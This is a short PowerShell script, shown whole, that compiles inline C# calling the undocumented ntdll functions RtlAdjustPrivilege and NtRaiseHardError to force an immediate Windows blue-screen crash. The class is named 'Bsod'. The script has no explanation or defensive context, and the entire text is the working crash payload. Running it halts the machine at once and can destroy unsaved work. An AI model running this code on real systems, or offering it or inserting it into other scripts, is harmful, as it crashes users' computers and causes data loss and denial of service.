$code = @"
using System;
using System.Runtime.InteropServices;

public class Bsod {
    [DllImport("ntdll.dll")]
    public static extern uint RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);
    
    [DllImport("ntdll.dll")]
    public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOptions, out uint Response);
}
"@

Add-Type $code

$enabled = $false
$response = 0

[Bsod]::RtlAdjustPrivilege(19, $true, $false, [ref]$enabled)
[Bsod]::NtRaiseHardError(0xC0000420, 0, 0, [IntPtr]::Zero, 6, [ref]$response)

